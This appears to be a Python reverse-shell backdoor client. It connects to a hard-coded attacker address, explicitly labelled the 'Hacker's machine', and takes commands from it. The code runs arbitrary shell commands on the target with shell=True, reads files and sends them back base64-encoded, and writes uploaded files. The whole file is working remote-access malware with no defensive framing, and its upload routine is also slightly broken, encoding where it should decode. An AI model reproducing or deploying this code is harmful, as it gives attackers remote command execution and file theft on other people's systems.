import socket
import subprocess
import json
import os
import base64

class SocketConnection:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # Connect to Hacker's machine
        # self.connection.send(b"Connection established...\n")

    # Sending Input
    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Processing Input
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Getting Input by Creating a subprocess to execute on Terminal of Target
    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    # Cd Command Implementation
    def cd_command(self,directory):
        os.chdir(directory)
        return "cd \\" + directory

    # Downloading file contents
    def getting_file_contents(self,path):
        with open(path, "rb") as my_file:
            file_bytes = my_file.read()
            return base64.b64encode(file_bytes).decode() # Returns string
            #return base64.b64encode(my_file.read()).decode('ascii')

    # Uploading files to Target
    def save_file(self, path, content):
        try:
            with open(path, "wb") as my_file:
                # Convert string to bytes if needed, then encode
                if isinstance(content, str):
                    content = content.encode() # String -> bytes
                    # Now content is bytes, encode to base64
                my_file.write(base64.b64encode(content))
                return "Uploaded successfully"
        except Exception:
            return "Error uploading file"

    def start_socket(self):
        while True: # Create infinite loop of execution of commands
            command = self.json_receive()
            try:
                if command[0] == "exit":
                   self.connection.close()
                   exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.getting_file_contents(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1],command[2])
                else:
                    command_output = self.command_execution(command).decode()
            except Exception:
                    command_output = "Error!!"

            self.json_send(command_output)
        self.connection.close()


socket_connection = SocketConnection("10.0.2.10",8080)
socket_connection.start_socket()


